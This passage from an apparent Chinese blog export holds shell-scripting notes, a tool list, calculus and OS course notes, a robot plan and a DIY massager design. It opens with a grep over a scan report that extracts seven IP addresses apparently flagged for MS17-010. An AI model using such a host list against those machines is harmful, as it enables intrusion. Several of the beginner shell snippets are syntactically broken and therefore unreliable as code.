<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">divint3@Divint3:~$ cat 123.txt | grep &quot;MS17-010&quot; | egrep -o  &quot;(\&lt;([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\&gt;\.)&#123;3&#125;\&lt;([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\&gt;&quot; | uniq &gt;&gt; 123.txt</span><br><span class="line"></span><br><span class="line">211.71.232.135</span><br><span class="line">211.71.232.139</span><br><span class="line">211.71.232.141</span><br><span class="line">211.71.232.142</span><br><span class="line">211.71.232.143</span><br><span class="line">211.71.232.147</span><br><span class="line">211.71.232.156</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for i in $(seq 5)</span><br><span class="line">do</span><br><span class="line">useradd user$i -m </span><br><span class="line">echo &quot;创建用户成功&quot; </span><br><span class="line">echo &quot;user$i&quot; | passwd --stdin &amp;&gt; /dev/null</span><br><span class="line">echo &quot;更新密码成功&quot;</span><br><span class="line"></span><br><span class="line">userdel -r user$i</span><br><span class="line">echo &quot;删除成功&quot;</span><br><span class="line"></span><br><span class="line">done </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件表达式</span><br><span class="line">    使用[  ]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd user1 -m &amp;&gt; /dev/null</span><br><span class="line">if($? -ne 0 )</span><br><span class="line">do</span><br><span class="line">    echo &quot;user1&quot; | passwd --stdin user1  </span><br><span class="line">done </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! id user &amp;&amp; useradd -m user || echo &quot;user exists&quot;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑与</span><br><span class="line">    &amp;&amp;</span><br><span class="line">逻辑或 </span><br><span class="line">    ||</span><br><span class="line">或与运算 </span><br><span class="line">    [逻辑式] 逻辑与 [ 逻辑式 ] 逻辑或 [式子]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1 &amp;&amp; echo &quot;user exisit&quot; || useradd </span><br><span class="line">id user1  &amp;&amp; useradd user1 || echo &quot;user1 exisit&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if 判断条件; then </span><br><span class="line">else </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">else </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">COUNT=`cat /etc/passwd | grep &quot;/bin/bash&quot; | wc -l`</span><br><span class="line">echo &quot;$COUNT&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cat /etc/inittab | grep  ^$ | wc -l</span><br><span class="line">echo $?</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">UID1=`cat /etc/passwd | grep $USER | cut -d: -f3`</span><br><span class="line">echo $UID1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux技术</category>
      </categories>
  </entry>
  <entry>
    <title>常用软件</title>
    <url>/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="常用软件">常用软件</h3>
<ol type="1">
<li>硬盘工具
<ol type="1">
<li>MRT (低级格式化工具)</li>
</ol></li>
<li>Rolan (软件启动器)</li>
<li>下载工具
<ol type="1">
<li>IDM</li>
<li>FDM</li>
</ol></li>
<li>文档工具
<ol type="1">
<li>Typora</li>
<li>Obsidian</li>
</ol></li>
<li>编辑软件
<ol type="1">
<li>Visual Studio Code</li>
<li>Sublime</li>
</ol></li>
<li>十六进制编辑工具
<ol type="1">
<li>WinHex</li>
<li>HexEdit</li>
</ol></li>
<li>照片信息读取
<ol type="1">
<li>ExifTool</li>
</ol></li>
<li>调试工具
<ol type="1">
<li>动态调试
<ol type="1">
<li>OllyDbg</li>
<li>x64dbg</li>
</ol></li>
<li>静态调试
<ol type="1">
<li>IDA Pro</li>
<li>Ghidra</li>
</ol></li>
</ol></li>
<li>PE信息查看器
<ol type="1">
<li>CFF Explorer</li>
</ol></li>
<li>查壳工具
<ol type="1">
<li>PEID</li>
<li>DetectIt Easy</li>
<li>EXEInfoPE</li>
<li></li>
</ol></li>
<li>仓库
<ol type="1">
<li>mvn:Nexus</li>
<li>docker:Harbor</li>
</ol></li>
<li>代码检测
<ol type="1">
<li>sonar</li>
</ol></li>
<li>负载均衡
<ol type="1">
<li>lvs</li>
<li>haproxy</li>
<li>nginx
<ol type="1">
<li>geo</li>
<li>upsteam</li>
</ol></li>
</ol></li>
<li>高可用
<ol type="1">
<li>keepalived</li>
<li>heartbeat</li>
</ol></li>
<li>负载均衡和高可用的搭档
<ol type="1">
<li>lvs:keepalived</li>
<li>haproxy:heartbeat</li>
</ol></li>
<li>socat可以用来管理haproxy的负载均衡</li>
<li>CI
<ol type="1">
<li>drone</li>
<li>jekins</li>
</ol></li>
<li>GITServer
<ol type="1">
<li>gitea</li>
<li>gogs</li>
</ol></li>
<li>java使用库
<ol type="1">
<li>testcontainers</li>
<li>junit</li>
<li>structamp</li>
<li>h2</li>
<li>flyway</li>
</ol></li>
<li>集群
<ol type="1">
<li>数据库
<ol type="1">
<li><pre><code>Galera</code></pre></li>
</ol></li>
</ol></li>
<li>ORM框架 Object Relational Mapping 对象关系映射框架
<ol type="1">
<li>Mybatis</li>
<li>JPA(Hibernate) Hibernate是原生JPA的上位替代</li>
</ol></li>
<li>连接池
<ol type="1">
<li>HikariCP</li>
<li>druid</li>
<li>tomcat-jdbc</li>
<li>dbcp</li>
<li>c3p0</li>
</ol></li>
<li>终端共享
<ol type="1">
<li>tmate</li>
</ol></li>
<li>p2p
<ol type="1">
<li>n2n</li>
</ol></li>
<li>嵌入式界面
<ol type="1">
<li>LVGL</li>
<li>MiniGUI</li>
<li>Qt for MCUs</li>
<li>emWin</li>
</ol></li>
<li>Windows平台 Windows memory hacking library
<ol type="1">
<li>BlackBone</li>
</ol></li>
<li>Linux平台 elf 文件查看工具
<ol type="1">
<li>readelf</li>
<li>file</li>
<li>nm</li>
<li>objdump</li>
<li>objcopy</li>
<li>addr2line</li>
<li>lsof</li>
</ol></li>
<li>监控同步软件
<ol type="1">
<li>同步专家远程版</li>
</ol></li>
<li>arduino
<ol type="1">
<li>多线程库
<ol type="1">
<li>ProtoThread</li>
<li>Scoop</li>
<li>FreeRTOS</li>
</ol></li>
<li>定时任务
<ol type="1">
<li>Tricker</li>
</ol></li>
</ol></li>
</ol>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>微积分的本质</title>
    <url>/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
    <content><![CDATA[<h3
id="导数要看做某一点附近的变化率而不是某一点的瞬时变化率因为瞬时没有意义">导数要看做某一点附近的变化率,而不是某一点的瞬时变化率,因为瞬时没有意义</h3>
<ul>
<li>瞬时是啥,能吃吗? <span id="more"></span> #### 导数完全体 <span
class="math display">\[
\frac{ds}{dt}(t)=\frac{s(t+dt)-s(t)}{dt}
\]</span></li>
</ul>
<h3 id="符号d表明了就是要求d描述的值趋近于0时的结果">符号<span
class="math inline">\(d\)</span>表明了就是要求<span
class="math inline">\(d\)</span>描述的值趋近于0时的结果</h3>
<ul>
<li><span class="math inline">\(dt\)</span>表明<span
class="math inline">\(t\)</span>趋近于零</li>
<li>导数的本质并不是分数,而是当所求变化量越来越小时这个比值的极限</li>
</ul>
<h3 id="求一个函数stt3在t2时的导数">求一个函数<span
class="math inline">\(s(t)=t^3\)</span>在<span
class="math inline">\(t=2\)</span>时的导数</h3>
<ul>
<li>先写出导数完全体</li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=\frac{s(2+dt)-s(2)}{dt}
\]</span></p>
<ul>
<li><p><span
class="math inline">\(\frac{ds}{dt}(2)\)</span>可表示为<span
class="math inline">\(\frac{d(2^3)}{dt}\)</span></p></li>
<li><p>再转换</p></li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=\frac{(2+dt)^3-(2)^3}{dt}
\]</span></p>
<ul>
<li>分步乘法</li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=\frac{2^3+3(2)^2dt+3(2)(dt)^2+(dt)^3-2^3}{dt}
\]</span></p>
<ul>
<li>化简</li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=3(2)^2+3(2)dt+(dt)^2
\]</span></p>
<ul>
<li>因为<span
class="math inline">\(dt\)</span>趋近于零,所以任何数乘以<span
class="math inline">\(0\)</span>都得零</li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=3(2)^2
\]</span></p>
<ul>
<li>得到结果</li>
</ul>
<p><span class="math display">\[
\frac{ds}{dt}(2)=12
\]</span></p>
<h4
id="结论学完微积分后的本能想法不必从头推导">结论(学完微积分后的本能想法,不必从头推导)</h4>
<p><span class="math display">\[
\frac{ds}{dt}(2)=3(t)^2
\]</span></p>
<h3 id="基本的组合函数">基本的组合函数</h3>
<h4 id="加法法则">加法法则</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/加法法则-直观.png" /></p>
<p><strong>口诀:组合函数加法就是先对其中的元素进行求导,再相加</strong></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/加法法则.png" /></p>
<h4 id="乘法法则">乘法法则</h4>
<h5
id="处理乘积通过面积来思考会更合适">处理乘积通过面积来思考会更合适</h5>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/乘法法则-直观.png" /></p>
<p><strong>口诀:前导后不导,后导前不导</strong></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/乘法法则.png" /></p>
<h4 id="链式法则">链式法则</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/链式法则.png" /></p>
<h3 id="多元复合函数求导法则">多元复合函数求导法则</h3>
<p>口诀:<strong>分段用乘, 分叉用加, 单路全导, 叉路偏导</strong></p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
  </entry>
  <entry>
    <title>恐怖机器人计划</title>
    <url>/%E6%81%90%E6%80%96%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h1 id="计划原型">计划原型</h1>
<h2 id="选型">选型</h2>
<p>控制器选型: Xbox Controller</p>
<p>控制方案:</p>
<ol type="1">
<li>gamepad内集成一个SOC,装上精简版Linux，使用XboxController驱动读取GamePad信号,再通过蓝牙透传传送至设备。这种方案的优势是机器人本体节电但是GamePad载体不节电，由于GamePad在手上，所以可以持续供电。
<ol type="1">
<li>也可以通过电脑链接GamePad读取信号，然后发送至蓝牙设备。</li>
</ol></li>
<li>机器人本体上安装Soc，使用Linux系统装载蓝牙驱动和GamePad驱动，用于读取GamePad信号并作出相关动作。</li>
</ol>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>按摩器</title>
    <url>/%E6%8C%89%E6%91%A9%E5%99%A8/</url>
    <content><![CDATA[<h2 id="按摩器">按摩器</h2>
<p>最近想做一个按摩器，可以用来放在背部用于按摩放松，也可以作为一个震动木马来刺激性高潮。</p>
<h3
id="尺寸规格-尚不确定待测试的时候进行调整方便性测试">尺寸规格-尚不确定，待测试的时候进行调整，方便性测试</h3>
<span id="more"></span>
<h3
id="圆柱体-如果作为一个震动木马来使用的话它是非插入式的">圆柱体-如果作为一个震动木马来使用的话，它是非插入式的</h3>
<ul>
<li>外壳
<ul>
<li>长度:35cm //待测试</li>
<li>直径:13cm //待测试</li>
<li>外层海绵层厚度:1.5cm</li>
<li>铝柱厚度:5mm //待测试，暂时无法知道是否达到承重标准</li>
<li>中空直径:11cm</li>
</ul></li>
<li>内容物
<ul>
<li>12V电池组/11.1V笔记本电脑电池组</li>
<li>12V转5V模块</li>
<li>蓝牙模块</li>
<li>wifi模块</li>
<li>stm32f10x</li>
<li>RS545-双振头马达-232克</li>
<li>12V充电板</li>
<li>电机驱动模块</li>
<li>扬声器</li>
<li>存储器/sd卡</li>
</ul></li>
</ul>
<h3
id="该产品使用rs545为震源模块化设计可以买模块进行功能扩充">该产品使用RS545为震源，模块化设计，可以买模块进行功能扩充</h3>
<h3
id="对于的重心偏移我想把中间的模块设置成可调整的样子类似于塑料束带使中间的器件可以偏移以手动调整重心">对于的重心偏移，我想把中间的模块设置成可调整的样子，类似于塑料束带使中间的器件可以偏移，以手动调整重心</h3>
<h3
id="外部的承重铝管也可以作为天线使用大大增强设备的无线功能">外部的承重铝管也可以作为天线使用，大大增强设备的无线功能。</h3>
<h3
id="通过stm32使用pwm对电机的转速进行控制通过蓝牙对stm32进行控制就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制">通过stm32使用pwm对电机的转速进行控制，通过蓝牙对stm32进行控制，就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制。</h3>
<p>我还想使本设备可以进行歌曲播放的同时进行速度调整，声音越高，震频越大，声音越小，震频越小，使人感受到音乐的震感。</p>
<p>现在只是整体架构，暂时使用blender进行模拟，后期会使用soildworks进行更真实的渲染。</p>
<p>现在只有一个外部框架的模型，等我什么时候有设备进行soildworks建模了，再把它继续做下去</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/海绵木马外部框架_v1.png" /></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第一节课笔记-什么是操作系统</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E4%BB%80%E4%B9%88%E6%98%AF%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E4%BB%80%E4%B9%88%E6%98%AF%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E4%BB%80%E4%B9%88%E6%98%AF%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.pdf" title="操作系统第一节课笔记-什么是操作系统pdf文档下载">操作系统第一节课笔记-什么是操作系统pdf文档下载</a>
<span id="more"></span>
<h1 id="操作系统">操作系统</h1>
<h2 id="什么是操作系统">什么是操作系统</h2>
<h3 id="操作系统的组成">操作系统的组成</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[操作系统]--&gt;B(软件)</span><br><span class="line">B--&gt;C(应用软件)</span><br><span class="line">B--&gt;D(系统软件)</span><br><span class="line">D--&gt;E(光盘刻录工具/汇编程序/编译程序/数据库管理系统)</span><br><span class="line">D--&gt;F(操作系统)</span><br><span class="line">A--&gt;G(硬件及固件)</span><br></pre></td></tr></table></figure>
<h4 id="操作系统由软件和硬件构成">操作系统由软件和硬件构成</h4>
<ul>
<li>计算机硬件作为基础</li>
<li>操作系统管理和调度硬件</li>
<li>系统工具例如iptables，可以修改内核的netfilter</li>
<li>应用软件 例如数据库管理软件</li>
<li>操作系统向上层提供系统调用</li>
<li>操作系统的作用就是将复杂的硬件调度封装起来，作为系统调用提供给其他软件</li>
</ul>
<h3 id="操作系统的设计目标">操作系统的设计目标</h3>
<ul>
<li>方便性 提供用户接口(Interface)，使计算机便于使用</li>
<li>有效性 合理分配资源，提高利用率，增加吞吐量(单位时间的工作量)</li>
<li>可扩充性 适应将来的硬件体系和对应的更高功能和性能要求</li>
<li>开放性
不针对特定的硬件，适应不同硬件，实现软件的可移植性和互操作性</li>
</ul>
<h2 id="操作系统的作用">操作系统的作用</h2>
<h3
id="用户与计算机硬件系统之间的接口">(1).用户与计算机硬件系统之间的接口</h3>
<h4 id="外壳shell">外壳(Shell)</h4>
<ul>
<li>面向一般用户</li>
<li>CLI，GUI，Script，Menu</li>
<li>使用户使用计算机更加便利 #### 系统调用(System Call)</li>
<li>面向开发人员</li>
<li>形式上类似于过程调用，编写程序的时候使用</li>
<li>软件和系统交互的基本机制 ### (2).系统资源管理 #### 管理对象</li>
<li>硬件对象和软件对象的控制 #### 管理内容</li>
<li>资源分配，回收，访问操作</li>
<li>记录资源当前状态，相应管理策略 ### (3).用作扩充机器</li>
<li>在硬件层上管理各种资源</li>
</ul>
<h2 id="操作系统组成及层次结构">操作系统组成及层次结构</h2>
<h3 id="三层结构">三层结构</h3>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">操作系统的三层结构</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">最上层为用户接口GUI,CLI等</td>
</tr>
<tr class="even">
<td style="text-align: center;">中间层为对象管理软件</td>
</tr>
<tr class="odd">
<td style="text-align: center;">最底层是操作系统抽象硬件等作为对象</td>
</tr>
</tbody>
</table>
<h3 id="结构细化">结构细化</h3>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/结构细化.png" />
## 操作系统定义</p>
<h3 id="最基本的系统软件">最基本的系统软件</h3>
<ul>
<li>有效管控硬件软件，对任务的合理调度，组织作业流程</li>
</ul>
<h2 id="操作系统发展的主要动力">操作系统发展的主要动力</h2>
<h3 id="硬件">硬件</h3>
<ul>
<li>提高硬件资源利用率</li>
<li>提高性能</li>
<li>支持新型硬件</li>
</ul>
<h3 id="人们的需求">人们的需求</h3>
<ul>
<li>改善用户体验</li>
</ul>
<h2 id="早期计算机">早期计算机</h2>
<h3 id="纸带计算机">纸带计算机</h3>
<ul>
<li>1946-50年代中期</li>
<li>价格昂贵，只有计算功能</li>
<li>工作方式
<ul>
<li>用户：管理员和使用者的双重身份</li>
<li>输入输出：卡带或纸片</li>
<li>编程语言：机器语言</li>
</ul></li>
</ul>
<h4 id="工作特点">工作特点：</h4>
<ul>
<li>资源利用率低</li>
<li>计算前后，CPU空闲时间浪费算力</li>
</ul>
<h2 id="速度矛盾和缓和途径">速度矛盾和缓和途径</h2>
<ul>
<li>通道技术，中断技术，缓冲技术
<ul>
<li>中断技术：把当前的寄存器中的内容入栈，保存现场，优先处理中断程序后出栈，恢复现场</li>
<li>通道技术：通道是独立于中央处理器的，专门负责数据I/O传输工作的理单元。通道对外部设备实行统一管理，它代替CPU对I/O操作进行控制，从而使CPU和外部设备可以并行工作。所以通道又称为I/O处理机。</li>
</ul></li>
<li>脱机输入输出
<ul>
<li>主机不参与对输出结果的使用</li>
</ul></li>
<li>专业操作员和批处理技术</li>
</ul>
<h3 id="单道批处理技术">单道批处理技术</h3>
<ul>
<li><p>提高系统资源利用率</p></li>
<li><p>在监督程序的控制下使作业连续进行</p></li>
<li><p>内存中始终存在着一道作业</p></li>
<li><p>吞吐量比纸带计算机提高很多 #### 特性：</p></li>
<li><p>自动性</p>
<ul>
<li>作业按次序执行，无需干预</li>
</ul></li>
<li><p>顺序性</p>
<ul>
<li>按顺序进入内存执行</li>
</ul></li>
<li><p>单道性</p>
<ul>
<li>只有一个程序可以运行，当其发生错误，调用监控程序管理作业，处理结束，退出内存，交出执行权</li>
</ul></li>
</ul>
<h3 id="多道批处理技术">多道批处理技术</h3>
<ul>
<li>多道程序在同一处理器上交替运行</li>
<li>通过作业调度算法调度作业，处理异常</li>
<li>吞吐量比单道批处理提高很多 #### 特性：</li>
<li>多道性
<ul>
<li>内存中有多道程序，允许并发执行</li>
</ul></li>
<li>无序性
<ul>
<li>多个作业何时进入内存没有严格的限定</li>
</ul></li>
<li>调度性
<ul>
<li>作业调度</li>
<li>进程调度</li>
</ul></li>
</ul>
<h4 id="优点">优点</h4>
<ul>
<li>资源利用率高</li>
<li>系统吞吐量大</li>
</ul>
<h4 id="缺点">缺点：</h4>
<ul>
<li>作业周转时间长，对短作业不公平</li>
<li>无交互，不利于调试和修改</li>
</ul>
<h4 id="需求分析">需求分析：</h4>
<ul>
<li>处理机管理问题
<ul>
<li>管理机分配</li>
<li>提高利用率</li>
<li>分配与回收</li>
</ul></li>
<li>内存管理问题
<ul>
<li>分配与保护</li>
</ul></li>
<li>IO设备管理问题
<ul>
<li>设备共享，提高利用率</li>
</ul></li>
<li>文件管理问题
<ul>
<li>文件组织方便用户使用</li>
<li>数据安全和一致性</li>
</ul></li>
<li>作业管理问题
<ul>
<li>作业调度</li>
<li>工作流程</li>
</ul></li>
</ul>
<h3 id="联机批处理">联机批处理</h3>
<ul>
<li>主机直接和输入输出机连接，由于输入很慢，造成cpu空闲。</li>
</ul>
<h3 id="脱机批处理">脱机批处理</h3>
<ul>
<li>主机不直接和输入输出机连接，用其他卫星机存储在存储介质上，后集中处理</li>
</ul>
<h2 id="分时系统">分时系统</h2>
<ul>
<li>人机交互
<ul>
<li>程序修改调试</li>
</ul></li>
<li>共享主机
<ul>
<li>处理器昂贵</li>
</ul></li>
<li>便于用户上机
<ul>
<li>单处理器多终端</li>
</ul></li>
<li>分时系统的概念
<ul>
<li>单主机，多终端，多用户，可交互使用计算机</li>
</ul></li>
</ul>
<h3 id="分时系统遇到的问题">分时系统遇到的问题</h3>
<ul>
<li>及时接受输入
<ul>
<li>多路卡，多路缓冲区</li>
</ul></li>
<li>及时处理
<ul>
<li>所有用户作业直接进入内存</li>
<li>有限时间内就可以将每个程序都运行一次 ### 分时系统的实现 ####
作业直接进入内存</li>
</ul></li>
<li>用户键入指令直接进入内存，不必等待</li>
</ul>
<h4 id="时间片轮转策略">时间片轮转策略</h4>
<ul>
<li>时间片很短，每个程序都运行一些时间周期就切换到其他程序，给人一种并发的错觉</li>
</ul>
<h4 id="实现方式">实现方式</h4>
<ul>
<li>单道分时系统</li>
<li>具有前台和后台的分时系统</li>
<li>多道分时系统</li>
</ul>
<h3 id="分时系统特征">分时系统特征</h3>
<ul>
<li>多路性
<ul>
<li>宏观上：多个用户同时工作，共享资源</li>
<li>微观上：每个用户轮流执行时间片</li>
</ul></li>
<li>独立性/独占性
<ul>
<li>互不干扰</li>
</ul></li>
<li>及时性
<ul>
<li>响应时间短</li>
</ul></li>
<li>交互性
<ul>
<li>用户可以通过终端与系统进行交互</li>
</ul></li>
</ul>
<h2 id="实时系统">实时系统</h2>
<ul>
<li>时间约束
<ul>
<li>截止时间</li>
</ul></li>
<li>可预测性
<ul>
<li>对任务的执行时间进行预判</li>
</ul></li>
<li>可靠性</li>
<li>交互作用</li>
</ul>
<h2 id="实时系统与分时系统比较">实时系统与分时系统比较</h2>
<h3 id="实时系统更追求于">实时系统更追求于</h3>
<ul>
<li><p>及时性</p></li>
<li><p>高度可靠</p></li>
</ul>
<h3 id="区别">区别</h3>
<ul>
<li>分时系统的目标是提供一种通用性很强的系统，有较强的交互能力；而实时系统则大都是具有特殊用途的专用系统，交互能力略差</li>
<li>分时系统对响应时间虽有要求，但一般来说，响应时间由人所能承受的等待时间来确定；而实时系统对响应时间要求很高，一般由控制系统或信息处理磁头所能接受的延迟时间来决定。</li>
</ul>
<h3
id="所谓多道程序设计是指将一个以上的作业放入内存并且同时准备运行这些作业共享处理机的时间和外围设备等其他资源">所谓多道程序设计是指将一个以上的作业放入内存，并且同时准备运行，这些作业共享处理机的时间和外围设备等其他资源。</h3>
<ul>
<li>多道程序设计是为了提高cpu的利用率</li>
</ul>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第七节课笔记-进程通信</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h1 id="进程通信概念及分类">进程通信概念及分类</h1>
<h2 id="进程通信">进程通信</h2>
<h3 id="实现机制">实现机制</h3>
<ul>
<li>进程通信概念
<ul>
<li>指进程之间的信息交换</li>
</ul></li>
<li>实现机制
<ul>
<li>低级进程通信：效率低，针对控制信息的传送。典型为信号量机制。</li>
<li>高级进程通信：能传送大量数据，效率高，进程通信实现细节由操作系统提供，整个通信对用户透明，通信程序编制简单
<span id="more"></span> ### 类型</li>
</ul></li>
<li>共享存储器系统（操作系统提供相应的系统调用）
<ul>
<li>基于共享数据结构的通信方式</li>
<li>基于共享存储区的通信方式</li>
</ul></li>
<li>信息传递系统
<ul>
<li>直接/间接通信方式</li>
</ul></li>
<li>管道通信系统
<ul>
<li>管道概念</li>
<li>协调机制：互斥、同步、通信前提</li>
</ul></li>
</ul>
<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/shm.tar.gz" title="共享内存示例下载">共享内存示例下载</a>
<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/pipe.tar.gz" title="管道示例下载">管道示例下载</a>
<h2 id="消息传递通信实现方式">消息传递通信实现方式</h2>
<h3 id="直接通信方式">直接通信方式</h3>
<ul>
<li>通信原语
<ul>
<li>Send(Receiver,message)；</li>
<li>Receive(Sender,message);
<ul>
<li>不知道发送者是谁
<ul>
<li>典型例子是打印机</li>
</ul></li>
</ul></li>
</ul></li>
<li>一个接收进程可以与多个发送进程通信
<ul>
<li>打印进程</li>
<li>Sender无法事先制定，故为变参性质</li>
</ul></li>
</ul>
<h3 id="间接通信方式">间接通信方式</h3>
<ul>
<li>信箱
<ul>
<li>进程间通信有关共享数据结构的中间实体</li>
<li>有操作系统或用户进程创建</li>
<li>私有/公有/共享信箱</li>
<li>可实现实时/非实时通信</li>
</ul></li>
<li>通信原语
<ul>
<li>信箱的创建和撤销、消息的发送和接收</li>
</ul></li>
<li>发送/接收金层间存在的四种关系
<ul>
<li>一对一、多对一、一对多、多对多</li>
</ul></li>
</ul>
<h3 id="信息传递系统中的几个问题">信息传递系统中的几个问题</h3>
<ul>
<li>通信链路
<ul>
<li>显式/隐式建立（计算机网络/单机）</li>
<li>点-点或多点连接通信链路</li>
<li>单/双向通信链路</li>
<li>无容量/有容量通信链路（缓冲区）</li>
</ul></li>
<li>消息格式
<ul>
<li>有消息头和效益正文构成，分定长/变长两种</li>
</ul></li>
<li>进程同步方式
<ul>
<li>发送/接受进程阻塞与否（三种情况）</li>
</ul></li>
</ul>
<h2 id="消息缓冲队列通信机制">消息缓冲队列通信机制</h2>
<h3 id="缓冲队列是通过数据结构实现的">缓冲队列是通过数据结构实现的</h3>
<p>消息缓冲队列是一种临界资源,应该设计相应的信号量进行访问控制</p>
<h4 id="消息缓冲区">消息缓冲区</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type MassageBuffer=record</span><br><span class="line">	Sender;</span><br><span class="line">	//发送者进程标识符</span><br><span class="line">	Size;</span><br><span class="line">	//消息长度</span><br><span class="line">	Text;</span><br><span class="line">	//消息正文</span><br><span class="line">	Next;</span><br><span class="line">	//指向下一缓冲区的指针</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="pcb通信数据项">PCB通信数据项</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type PCB=record</span><br><span class="line">	massageQueue;</span><br><span class="line">	//队首指针</span><br><span class="line">	mutexOfMQ;</span><br><span class="line">	//消息队列互斥信号量</span><br><span class="line">	semphoreOfMQ;</span><br><span class="line">	//消息队列资源信号量</span><br><span class="line">	...</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4
id="假设a发送消息给ba使用发送原语把消息队列挂接到b的进程控制块的消息缓冲区b使用接收原语从pcb上接收数据队列拷贝到本进程的接收区中">假设A发送消息给B,A使用发送原语,把消息队列挂接到B的进程控制块的消息缓冲区,B使用接收原语,从PCB上接收数据队列,拷贝到本进程的接收区中</h4>
<h4 id="发送原语">发送原语</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Procedure Sender(Receiver,SA)</span><br><span class="line">Begin</span><br><span class="line">	getBuf(SA.Size,Buffer_i);</span><br><span class="line">	//创建缓冲区</span><br><span class="line">	Buffer_i.Sender:=SA.Sender;Buffer_i.Size:=SA.Size;</span><br><span class="line">	Buffer_i.Text:=SA.Text;Buffer_i.Next:=0;</span><br><span class="line">	//把数据拷贝到缓冲区中</span><br><span class="line">	getid(PCB_Set,Receiver,PID);</span><br><span class="line">	//从PCB区通过进程名解析目标进程ID</span><br><span class="line">	wait(PID.mutexOfMQ);</span><br><span class="line">	//因为是对临界资源的操作,所以要使用互斥信号量</span><br><span class="line">	